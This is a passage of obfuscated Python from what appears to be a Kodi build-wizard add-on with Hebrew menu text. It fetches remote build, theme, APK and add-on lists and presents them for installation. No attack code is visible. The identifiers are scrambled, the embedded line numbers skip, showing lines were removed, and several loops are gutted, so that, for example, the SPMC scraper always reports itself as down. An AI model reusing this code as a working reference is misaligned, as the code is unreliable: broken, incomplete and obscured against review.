	O00O0OOOOO0OO0OO0 =wiz .workingURL (SPEEDFILE )#line:2212
	if not O00O0OOOOO0OO0OO0 ==True :#line:2213
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2214
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2215
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2216
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2217
		addFile ('%s'%O00O0OOOOO0OO0OO0 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2218
	else :#line:2219
		OO000O00OO000O0O0 ,O0O0OO000OOO0O00O ,OOOO0000O0O0OOOO0 ,O0OO00OO0O0OOOO0O ,OO0000OO0O0O0000O ,OOO0O00O0O0O0O000 ,OO0OO0OOO0000OO0O =wiz .buildCount ()#line:2220
		O00O0O00000O00OO0 =False ;O0OO00000O0OO0OOO =[]#line:2221
		if THIRDPARTY =='true':#line:2222
			if not THIRD1NAME ==''and not THIRD1URL =='':O00O0O00000O00OO0 =True ;O0OO00000O0OO0OOO .append ('1')#line:2223
			if not THIRD2NAME ==''and not THIRD2URL =='':O00O0O00000O00OO0 =True ;O0OO00000O0OO0OOO .append ('2')#line:2224
			if not THIRD3NAME ==''and not THIRD3URL =='':O00O0O00000O00OO0 =True ;O0OO00000O0OO0OOO .append ('3')#line:2225
		OO0OOO0000OO0O0OO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2226
		O0OO000O0O000OOO0 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0OOO0000OO0O0OO )#line:2227
		if OO000O00OO000O0O0 ==1 and O00O0O00000O00OO0 ==False :#line:2228
			for O00OOOO00OOO0O0OO ,OOOO0OO0OO000OO00 ,OO00OO000000O0000 ,O0OO00OO0000O00O0 ,O0O0O000000OOO0OO ,O00OOOOOOO0O0O000 ,O0OO0O00O00000OOO ,O0OO0OOO00O00O0O0 ,O000OO0OOOOO0000O ,O0O0OOO00O0O0O000 in O0OO000O0O000OOO0 :#line:2229
				if not SHOWADULT =='true'and O000OO0OOOOO0000O .lower ()=='yes':continue #line:2230
				if not DEVELOPER =='true'and wiz .strTest (O00OOOO00OOO0O0OO ):continue #line:2231
				viewBuild (O0OO000O0O000OOO0 [0 ][0 ])#line:2232
				return #line:2233
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2236
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2237
		if O00O0O00000O00OO0 ==True :#line:2238
			for OOOOO00O000O0000O in O0OO00000O0OO0OOO :#line:2239
				O00OOOO00OOO0O0OO =eval ('THIRD%sNAME'%OOOOO00O000O0000O )#line:2240
		if len (O0OO000O0O000OOO0 )>=1 :#line:2242
			if SEPERATE =='true':#line:2243
				for O00OOOO00OOO0O0OO ,OOOO0OO0OO000OO00 ,OO00OO000000O0000 ,O0OO00OO0000O00O0 ,O0O0O000000OOO0OO ,O00OOOOOOO0O0O000 ,O0OO0O00O00000OOO ,O0OO0OOO00O00O0O0 ,O000OO0OOOOO0000O ,O0O0OOO00O0O0O000 in O0OO000O0O000OOO0 :#line:2244
					if not SHOWADULT =='true'and O000OO0OOOOO0000O .lower ()=='yes':continue #line:2245
					if not DEVELOPER =='true'and wiz .strTest (O00OOOO00OOO0O0OO ):continue #line:2246
					OOO0O000000OOO00O =createMenu ('install','',O00OOOO00OOO0O0OO )#line:2247
					addDir ('[%s] %s (v%s)'%(float (O0O0O000000OOO0OO ),O00OOOO00OOO0O0OO ,OOOO0OO0OO000OO00 ),'viewbuild',O00OOOO00OOO0O0OO ,description =O0O0OOO00O0O0O000 ,fanart =O0OO0OOO00O00O0O0 ,icon =O0OO0O00O00000OOO ,menu =OOO0O000000OOO00O ,themeit =THEME2 )#line:2248
			else :#line:2249
				if O0OO00OO0O0OOOO0O >0 :#line:2250
					OOOO000O0O0000O0O ='+'if SHOW17 =='false'else '-'#line:2251
					if SHOW17 =='true':#line:2253
						for O00OOOO00OOO0O0OO ,OOOO0OO0OO000OO00 ,OO00OO000000O0000 ,O0OO00OO0000O00O0 ,O0O0O000000OOO0OO ,O00OOOOOOO0O0O000 ,O0OO0O00O00000OOO ,O0OO0OOO00O00O0O0 ,O000OO0OOOOO0000O ,O0O0OOO00O0O0O000 in O0OO000O0O000OOO0 :#line:2255
							if not SHOWADULT =='true'and O000OO0OOOOO0000O .lower ()=='yes':continue #line:2256
							if not DEVELOPER =='true'and wiz .strTest (O00OOOO00OOO0O0OO ):continue #line:2257
							OOO0OOO0000O00O0O =int (float (O0O0O000000OOO0OO ))#line:2258
							if OOO0OOO0000O00O0O ==17 :#line:2259
								OOO0O000000OOO00O =createMenu ('install','',O00OOOO00OOO0O0OO )#line:2260
								addDir ('[%s] %s (v%s)'%(float (O0O0O000000OOO0OO ),O00OOOO00OOO0O0OO ,OOOO0OO0OO000OO00 ),'viewbuild',O00OOOO00OOO0O0OO ,description =O0O0OOO00O0O0O000 ,fanart =O0OO0OOO00O00O0O0 ,icon =O0OO0O00O00000OOO ,menu =OOO0O000000OOO00O ,themeit =THEME2 )#line:2261
				if OO0000OO0O0O0000O >0 :#line:2262
					OOOO000O0O0000O0O ='+'if SHOW18 =='false'else '-'#line:2263
					if SHOW18 =='true':#line:2265
						for O00OOOO00OOO0O0OO ,OOOO0OO0OO000OO00 ,OO00OO000000O0000 ,O0OO00OO0000O00O0 ,O0O0O000000OOO0OO ,O00OOOOOOO0O0O000 ,O0OO0O00O00000OOO ,O0OO0OOO00O00O0O0 ,O000OO0OOOOO0000O ,O0O0OOO00O0O0O000 in O0OO000O0O000OOO0 :#line:2267
							if not SHOWADULT =='true'and O000OO0OOOOO0000O .lower ()=='yes':continue #line:2268
							if not DEVELOPER =='true'and wiz .strTest (O00OOOO00OOO0O0OO ):continue #line:2269
							OOO0OOO0000O00O0O =int (float (O0O0O000000OOO0OO ))#line:2270
							if OOO0OOO0000O00O0O ==18 :#line:2271
								OOO0O000000OOO00O =createMenu ('install','',O00OOOO00OOO0O0OO )#line:2272
								addDir ('[%s] %s (v%s)'%(float (O0O0O000000OOO0OO ),O00OOOO00OOO0O0OO ,OOOO0OO0OO000OO00 ),'viewbuild',O00OOOO00OOO0O0OO ,description =O0O0OOO00O0O0O000 ,fanart =O0OO0OOO00O00O0O0 ,icon =O0OO0O00O00000OOO ,menu =OOO0O000000OOO00O ,themeit =THEME2 )#line:2273
				if OOOO0000O0O0OOOO0 >0 :#line:2274
					OOOO000O0O0000O0O ='+'if SHOW16 =='false'else '-'#line:2275
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOOO000O0O0000O0O ,OOOO0000O0O0OOOO0 ),'togglesetting','show16',themeit =THEME3 )#line:2276
					if SHOW16 =='true':#line:2277
						for O00OOOO00OOO0O0OO ,OOOO0OO0OO000OO00 ,OO00OO000000O0000 ,O0OO00OO0000O00O0 ,O0O0O000000OOO0OO ,O00OOOOOOO0O0O000 ,O0OO0O00O00000OOO ,O0OO0OOO00O00O0O0 ,O000OO0OOOOO0000O ,O0O0OOO00O0O0O000 in O0OO000O0O000OOO0 :#line:2278
							if not SHOWADULT =='true'and O000OO0OOOOO0000O .lower ()=='yes':continue #line:2279
							if not DEVELOPER =='true'and wiz .strTest (O00OOOO00OOO0O0OO ):continue #line:2280
							OOO0OOO0000O00O0O =int (float (O0O0O000000OOO0OO ))#line:2281
							if OOO0OOO0000O00O0O ==16 :#line:2282
								OOO0O000000OOO00O =createMenu ('install','',O00OOOO00OOO0O0OO )#line:2283
								addDir ('[%s] %s (v%s)'%(float (O0O0O000000OOO0OO ),O00OOOO00OOO0O0OO ,OOOO0OO0OO000OO00 ),'viewbuild',O00OOOO00OOO0O0OO ,description =O0O0OOO00O0O0O000 ,fanart =O0OO0OOO00O00O0O0 ,icon =O0OO0O00O00000OOO ,menu =OOO0O000000OOO00O ,themeit =THEME2 )#line:2284
				if O0O0OO000OOO0O00O >0 :#line:2285
					OOOO000O0O0000O0O ='+'if SHOW15 =='false'else '-'#line:2286
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOOO000O0O0000O0O ,O0O0OO000OOO0O00O ),'togglesetting','show15',themeit =THEME3 )#line:2287
					if SHOW15 =='true':#line:2288
						for O00OOOO00OOO0O0OO ,OOOO0OO0OO000OO00 ,OO00OO000000O0000 ,O0OO00OO0000O00O0 ,O0O0O000000OOO0OO ,O00OOOOOOO0O0O000 ,O0OO0O00O00000OOO ,O0OO0OOO00O00O0O0 ,O000OO0OOOOO0000O ,O0O0OOO00O0O0O000 in O0OO000O0O000OOO0 :#line:2289
							if not SHOWADULT =='true'and O000OO0OOOOO0000O .lower ()=='yes':continue #line:2290
							if not DEVELOPER =='true'and wiz .strTest (O00OOOO00OOO0O0OO ):continue #line:2291
							OOO0OOO0000O00O0O =int (float (O0O0O000000OOO0OO ))#line:2292
							if OOO0OOO0000O00O0O <=15 :#line:2293
								OOO0O000000OOO00O =createMenu ('install','',O00OOOO00OOO0O0OO )#line:2294
								addDir ('[%s] %s (v%s)'%(float (O0O0O000000OOO0OO ),O00OOOO00OOO0O0OO ,OOOO0OO0OO000OO00 ),'viewbuild',O00OOOO00OOO0O0OO ,description =O0O0OOO00O0O0O000 ,fanart =O0OO0OOO00O00O0O0 ,icon =O0OO0O00O00000OOO ,menu =OOO0O000000OOO00O ,themeit =THEME2 )#line:2295
		elif OO0OO0OOO0000OO0O >0 :#line:2296
			if OOO0O00O0O0O0O000 >0 :#line:2297
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2298
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2299
			else :#line:2300
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2301
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2302
	setView ('files','viewType')#line:2303
def viewBuild (OOO00OOOO000OOOO0 ):#line:2305
	OOOOOO00O000O0O0O =wiz .workingURL (SPEEDFILE )#line:2306
	if not OOOOOO00O000O0O0O ==True :#line:2307
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2308
		addFile ('%s'%OOOOOO00O000O0O0O ,'',themeit =THEME3 )#line:2309
		return #line:2310
	if wiz .checkBuild (OOO00OOOO000OOOO0 ,'version')==False :#line:2311
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2312
		addFile ('%s was not found in the builds list.'%OOO00OOOO000OOOO0 ,'',themeit =THEME3 )#line:2313
		return #line:2314
	OO00OO00000000O00 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2315
	OO0OOOO0O0O0OO0O0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOO00OOOO000OOOO0 ).findall (OO00OO00000000O00 )#line:2316
	for O00000OO0O0OO0OOO ,OO0OO0OOO000OO0O0 ,OO000000O0O0OO000 ,O00O0O0OOO0000OO0 ,OO0000OOO0O00000O ,OOO00OOOOO00OO000 ,O00OO0OOOO0O0O000 ,OOOO0OO0O0OO0O0O0 ,OO0OOO0O0O00O000O ,OOOO0OOO00O000OO0 in OO0OOOO0O0O0OO0O0 :#line:2317
		OOO00OOOOO00OO000 =OOO00OOOOO00OO000 if wiz .workingURL (OOO00OOOOO00OO000 )else ICON #line:2318
		O00OO0OOOO0O0O000 =O00OO0OOOO0O0O000 if wiz .workingURL (O00OO0OOOO0O0O000 )else FANART #line:2319
		O000OOOOOO0000O0O ='%s (v%s)'%(OOO00OOOO000OOOO0 ,O00000OO0O0OO0OOO )#line:2320
		if BUILDNAME ==OOO00OOOO000OOOO0 and O00000OO0O0OO0OOO >BUILDVERSION :#line:2321
			O000OOOOOO0000O0O ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O000OOOOOO0000O0O ,BUILDVERSION )#line:2322
		OOOO0O0O00OOOO0O0 =int (float (KODIV ));O000O0000OOOOO00O =int (float (O00O0O0OOO0000OO0 ))#line:2331
		if not OOOO0O0O00OOOO0O0 ==O000O0000OOOOO00O :#line:2332
			if OOOO0O0O00OOOO0O0 ==16 and O000O0000OOOOO00O <=15 :OO00000OOOO00O0O0 =False #line:2333
			else :OO00000OOOO00O0O0 =True #line:2334
		else :OO00000OOOO00O0O0 =False #line:2335
		addFile ('התקנה','install',OOO00OOOO000OOOO0 ,'fresh',description =OOOO0OOO00O000OO0 ,fanart =O00OO0OOOO0O0O000 ,icon =OOO00OOOOO00OO000 ,themeit =THEME1 )#line:2339
		if not OO0000OOO0O00000O =='http://':#line:2342
			if wiz .workingURL (OO0000OOO0O00000O )==True :#line:2343
				addFile (wiz .sep ('THEMES'),'',fanart =O00OO0OOOO0O0O000 ,icon =OOO00OOOOO00OO000 ,themeit =THEME3 )#line:2344
				OO00OO00000000O00 =wiz .openURL (OO0000OOO0O00000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2345
				OO0OOOO0O0O0OO0O0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00OO00000000O00 )#line:2346
				for OOOO00O0OOOO00O00 ,O0OOOOOO00OOO000O ,OO0O0OO0O0O00O0O0 ,OOO0OO000OOO0000O ,O00O00OO0OOO0O00O ,OOOO0OOO00O000OO0 in OO0OOOO0O0O0OO0O0 :#line:2347
					if not SHOWADULT =='true'and O00O00OO0OOO0O00O .lower ()=='yes':continue #line:2348
					OO0O0OO0O0O00O0O0 =OO0O0OO0O0O00O0O0 if OO0O0OO0O0O00O0O0 =='http://'else OOO00OOOOO00OO000 #line:2349
					OOO0OO000OOO0000O =OOO0OO000OOO0000O if OOO0OO000OOO0000O =='http://'else O00OO0OOOO0O0O000 #line:2350
					addFile (OOOO00O0OOOO00O00 if not OOOO00O0OOOO00O00 ==BUILDTHEME else "[B]%s (Installed)[/B]"%OOOO00O0OOOO00O00 ,'theme',OOO00OOOO000OOOO0 ,OOOO00O0OOOO00O00 ,description =OOOO0OOO00O000OO0 ,fanart =OOO0OO000OOO0000O ,icon =OO0O0OO0O0O00O0O0 ,themeit =THEME3 )#line:2351
	setView ('files','viewType')#line:2352
def viewThirdList (OO000OOOOO0OO0O0O ):#line:2354
	OOO000O0OO0OOOOOO =eval ('THIRD%sNAME'%OO000OOOOO0OO0O0O )#line:2355
	O0O0OOOOO00O0O0O0 =eval ('THIRD%sURL'%OO000OOOOO0OO0O0O )#line:2356
	O0OO00OOO0O0OOO00 =wiz .workingURL (O0O0OOOOO00O0O0O0 )#line:2357
	if not O0OO00OOO0O0OOO00 ==True :#line:2358
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2359
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2360
	else :#line:2361
		OO0OO00O000OOO00O ,O0O0OO000O0O0OOOO =wiz .thirdParty (O0O0OOOOO00O0O0O0 )#line:2362
		addFile ("[B]%s[/B]"%OOO000O0OO0OOOOOO ,'',themeit =THEME3 )#line:2363
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2364
		if OO0OO00O000OOO00O :#line:2365
			for OOO000O0OO0OOOOOO ,O0O0OOOOO0OOO0O0O ,O0O0OOOOO00O0O0O0 ,O000OOOO00O0O00O0 ,O00OO000O0O00O00O ,OOO000O0OO00O0O00 ,OOO0OO0000O0OOO00 ,OO00O000000O0OOOO in O0O0OO000O0O0OOOO :#line:2366
				if not SHOWADULT =='true'and OOO0OO0000O0OOO00 .lower ()=='yes':continue #line:2367
				addFile ("[%s] %s v%s"%(O000OOOO00O0O00O0 ,OOO000O0OO0OOOOOO ,O0O0OOOOO0OOO0O0O ),'installthird',OOO000O0OO0OOOOOO ,O0O0OOOOO00O0O0O0 ,icon =O00OO000O0O00O00O ,fanart =OOO000O0OO00O0O00 ,description =OO00O000000O0OOOO ,themeit =THEME2 )#line:2368
		else :#line:2369
			for OOO000O0OO0OOOOOO ,O0O0OOOOO00O0O0O0 ,O00OO000O0O00O00O ,OOO000O0OO00O0O00 ,OO00O000000O0OOOO in O0O0OO000O0O0OOOO :#line:2370
				addFile (OOO000O0OO0OOOOOO ,'installthird',OOO000O0OO0OOOOOO ,O0O0OOOOO00O0O0O0 ,icon =O00OO000O0O00O00O ,fanart =OOO000O0OO00O0O00 ,description =OO00O000000O0OOOO ,themeit =THEME2 )#line:2371
def editThirdParty (O0O000OO0O00OOO0O ):#line:2373
	O000OOOO00O0O00OO =eval ('THIRD%sNAME'%O0O000OO0O00OOO0O )#line:2374
	O0O0O00000O00000O =eval ('THIRD%sURL'%O0O000OO0O00OOO0O )#line:2375
	O0000OOO0OO00O0O0 =wiz .getKeyboard (O000OOOO00O0O00OO ,'Enter the Name of the Wizard')#line:2376
	O0O0000OO0OOO0000 =wiz .getKeyboard (O0O0O00000O00000O ,'Enter the URL of the Wizard Text')#line:2377
	wiz .setS ('wizard%sname'%O0O000OO0O00OOO0O ,O0000OOO0OO00O0O0 )#line:2379
	wiz .setS ('wizard%surl'%O0O000OO0O00OOO0O ,O0O0000OO0OOO0000 )#line:2380
def apkScraper (name =""):#line:2382
	if name =='kodi':#line:2383
		OOOO00OO000OO00OO ='http://mirrors.kodi.tv/releases/android/arm/'#line:2384
		OO0OOO0O0OOO000O0 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2385
		OO00O0O0000OOO00O =wiz .openURL (OOOO00OO000OO00OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2386
		O00OO0O0OOO0OO0O0 =wiz .openURL (OO0OOO0O0OOO000O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2387
		OOO0OOOOO0O0O0O00 =0 #line:2388
		O0O0O00O0O0000OOO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO00O0O0000OOO00O )#line:2389
		O0OO00O0OOO0O000O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O00OO0O0OOO0OO0O0 )#line:2390
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2392
		O0OO000000OOOO000 =False #line:2393
		for O0OO0OO0O000O0000 ,name ,OOO000O0OO0OO0000 ,OO0OO00O00OOO00OO in O0O0O00O0O0000OOO :#line:2394
			if O0OO0OO0O000O0000 in ['../','old/']:continue #line:2395
			if not O0OO0OO0O000O0000 .endswith ('.apk'):continue #line:2396
			if not O0OO0OO0O000O0000 .find ('_')==-1 and O0OO000000OOOO000 ==True :continue #line:2397
			try :#line:2398
				OO00O000O0O000O0O =name .split ('-')#line:2399
				if not O0OO0OO0O000O0000 .find ('_')==-1 :#line:2400
					O0OO000000OOOO000 =True #line:2401
					OOOO0OO0O0OOOO00O ,O000OO0OO0OO000O0 =OO00O000O0O000O0O [2 ].split ('_')#line:2402
				else :#line:2403
					OOOO0OO0O0OOOO00O =OO00O000O0O000O0O [2 ]#line:2404
					O000OO0OO0OO000O0 =''#line:2405
				O0OO000O00O0O00OO ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00O000O0O000O0O [0 ].title (),OO00O000O0O000O0O [1 ],O000OO0OO0OO000O0 .upper (),OOOO0OO0O0OOOO00O ,COLOR2 ,OOO000O0OO0OO0000 .replace (' ',''),COLOR1 ,OO0OO00O00OOO00OO )#line:2406
				OOO0OO00OO000000O =urljoin (OOOO00OO000OO00OO ,O0OO0OO0O000O0000 )#line:2407
				addFile (O0OO000O00O0O00OO ,'apkinstall',"%s v%s%s %s"%(OO00O000O0O000O0O [0 ].title (),OO00O000O0O000O0O [1 ],O000OO0OO0OO000O0 .upper (),OOOO0OO0O0OOOO00O ),OOO0OO00OO000000O )#line:2408
				OOO0OOOOO0O0O0O00 +=1 #line:2409
			except :#line:2410
				wiz .log ("Error on: %s"%name )#line:2411
		for O0OO0OO0O000O0000 ,name ,OOO000O0OO0OO0000 ,OO0OO00O00OOO00OO in O0OO00O0OOO0O000O :#line:2413
			if O0OO0OO0O000O0000 in ['../','old/']:continue #line:2414
			if not O0OO0OO0O000O0000 .endswith ('.apk'):continue #line:2415
			if not O0OO0OO0O000O0000 .find ('_')==-1 :continue #line:2416
			try :#line:2417
				OO00O000O0O000O0O =name .split ('-')#line:2418
				O0OO000O00O0O00OO ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00O000O0O000O0O [0 ].title (),OO00O000O0O000O0O [1 ],OO00O000O0O000O0O [2 ],COLOR2 ,OOO000O0OO0OO0000 .replace (' ',''),COLOR1 ,OO0OO00O00OOO00OO )#line:2419
				OOO0OO00OO000000O =urljoin (OO0OOO0O0OOO000O0 ,O0OO0OO0O000O0000 )#line:2420
				addFile (O0OO000O00O0O00OO ,'apkinstall',"%s v%s %s"%(OO00O000O0O000O0O [0 ].title (),OO00O000O0O000O0O [1 ],OO00O000O0O000O0O [2 ]),OOO0OO00OO000000O )#line:2421
				OOO0OOOOO0O0O0O00 +=1 #line:2422
			except :#line:2423
				wiz .log ("Error on: %s"%name )#line:2424
		if OOO0OOOOO0O0O0O00 ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2425
	elif name =='spmc':#line:2426
		OO000O000OO0O0O0O ='https://github.com/koying/SPMC/releases'#line:2427
		OO00O0O0000OOO00O =wiz .openURL (OO000O000OO0O0O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2428
		OOO0OOOOO0O0O0O00 =0 #line:2429
		O0O0O00O0O0000OOO =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OO00O0O0000OOO00O )#line:2430
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2432
		for name ,OO0O00OOO0O00OO0O in O0O0O00O0O0000OOO :#line:2434
			O0O0O0000000O00OO =''#line:2435
			O0OO00O0OOO0O000O =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OO0O00OOO0O00OO0O )#line:2436
			for O0000O00OOOOO00OO ,OO0000O0000O00OOO ,O00O0O00OOOOOOOOO in O0OO00O0OOO0O000O :#line:2437
				if O00O0O00OOOOOOOOO .find ('armeabi')==-1 :continue #line:2438
				if O00O0O00OOOOOOOOO .find ('launcher')>-1 :continue #line:2439
				O0O0O0000000O00OO =urljoin ('https://github.com',O0000O00OOOOO00OO )#line:2440
				break #line:2441
		if OOO0OOOOO0O0O0O00 ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2443
def apkMenu (url =None ):#line:2445
	if url ==None :#line:2446
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2449
	if not APKFILE =='http://':#line:2450
		if url ==None :#line:2451
			OO00O0OOO00O00OO0 =wiz .workingURL (APKFILE )#line:2452
			O0O00O0O000OO000O =uservar .APKFILE #line:2453
		else :#line:2454
			OO00O0OOO00O00OO0 =wiz .workingURL (url )#line:2455
			O0O00O0O000OO000O =url #line:2456
		if OO00O0OOO00O00OO0 ==True :#line:2457
			O0O00OOOOOOOOO000 =wiz .openURL (O0O00O0O000OO000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2458
			OO0OO0000O000O00O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O00OOOOOOOOO000 )#line:2459
			if len (OO0OO0000O000O00O )>0 :#line:2460
				OOOO0O00OOOO0OOO0 =0 #line:2461
				for O0OOOO00000OO0O0O ,OO0O0O0OO0O0O0O0O ,url ,O00OOO000O00OO00O ,O00OOO00O0O0OO000 ,O0000000OOO00O00O ,O000OOO0O000O0O00 in OO0OO0000O000O00O :#line:2462
					if not SHOWADULT =='true'and O0000000OOO00O00O .lower ()=='yes':continue #line:2463
					if OO0O0O0OO0O0O0O0O .lower ()=='yes':#line:2464
						OOOO0O00OOOO0OOO0 +=1 #line:2465
						addDir ("[B]%s[/B]"%O0OOOO00000OO0O0O ,'apk',url ,description =O000OOO0O000O0O00 ,icon =O00OOO000O00OO00O ,fanart =O00OOO00O0O0OO000 ,themeit =THEME3 )#line:2466
					else :#line:2467
						OOOO0O00OOOO0OOO0 +=1 #line:2468
						addFile (O0OOOO00000OO0O0O ,'apkinstall',O0OOOO00000OO0O0O ,url ,description =O000OOO0O000O0O00 ,icon =O00OOO000O00OO00O ,fanart =O00OOO00O0O0OO000 ,themeit =THEME2 )#line:2469
					if OOOO0O00OOOO0OOO0 <1 :#line:2470
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2471
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2472
		else :#line:2473
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2474
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2475
			addFile ('%s'%OO00O0OOO00O00OO0 ,'',themeit =THEME3 )#line:2476
		return #line:2477
	else :wiz .log ("[APK Menu] No APK list added.")#line:2478
	setView ('files','viewType')#line:2479
def addonMenu (url =None ):#line:2481
	if not ADDONFILE =='http://':#line:2482
		if url ==None :#line:2483
			O0OO0O0O00O0000O0 =wiz .workingURL (ADDONFILE )#line:2484
			OO00000OOO000O0OO =uservar .ADDONFILE #line:2485
		else :#line:2486
			O0OO0O0O00O0000O0 =wiz .workingURL (url )#line:2487
			OO00000OOO000O0OO =url #line:2488
		if O0OO0O0O00O0000O0 ==True :#line:2489
			O0OOOO0O00O000O00 =wiz .openURL (OO00000OOO000O0OO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2490
			O0OO0O0OOO0O000OO =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OOOO0O00O000O00 )#line:2491
			if len (O0OO0O0OOO0O000OO )>0 :#line:2492
				O00O00O00OOOO0O00 =0 #line:2493
				for O0OO00O0OOOO0O000 ,OOOO0O0O0O0OOO0O0 ,url ,OO00OO00OOO00O0O0 ,OO000O0000OOO0OO0 ,O0O00OO00O000OO0O ,OO000000OOOO0O00O ,O0000OO000OOO0000 ,OOOOOOOOO0O00O00O ,O0O00O00O0O0O00O0 in O0OO0O0OOO0O000OO :#line:2494
					if OOOO0O0O0O0OOO0O0 .lower ()=='section':#line:2495
						O00O00O00OOOO0O00 +=1 #line:2496
						addDir ("[B]%s[/B]"%O0OO00O0OOOO0O000 ,'addons',url ,description =O0O00O00O0O0O00O0 ,icon =OO000000OOOO0O00O ,fanart =O0000OO000OOO0000 ,themeit =THEME3 )#line:2497
					else :#line:2498
						if not SHOWADULT =='true'and OOOOOOOOO0O00O00O .lower ()=='yes':continue #line:2499
						try :#line:2500
							O0O0OOO00O0O00O00 =xbmcaddon .Addon (id =OOOO0O0O0O0OOO0O0 ).getAddonInfo ('path')#line:2501
							if os .path .exists (O0O0OOO00O0O00O00 ):#line:2502
								O0OO00O0OOOO0O000 ="[COLOR green][Installed][/COLOR] %s"%O0OO00O0OOOO0O000 #line:2503
						except :#line:2504
							pass #line:2505
						O00O00O00OOOO0O00 +=1 #line:2506
						addFile (O0OO00O0OOOO0O000 ,'addoninstall',OOOO0O0O0O0OOO0O0 ,OO00000OOO000O0OO ,description =O0O00O00O0O0O00O0 ,icon =OO000000OOOO0O00O ,fanart =O0000OO000OOO0000 ,themeit =THEME2 )#line:2507
					if O00O00O00OOOO0O00 <1 :#line:2508
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2509
			else :#line:2510
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2511
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2512
		else :#line:2513
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2514
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2515
			addFile ('%s'%O0OO0O0O00O0000O0 ,'',themeit =THEME3 )#line:2516
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2517
	setView ('files','viewType')#line:2518
def addonInstaller (O0OOO00OO00O00000 ,OOOO00O000000OO00 ):#line:2520
	if not ADDONFILE =='http://':#line:2521
		OO00O0O00OO0O00OO =wiz .workingURL (OOOO00O000000OO00 )#line:2522
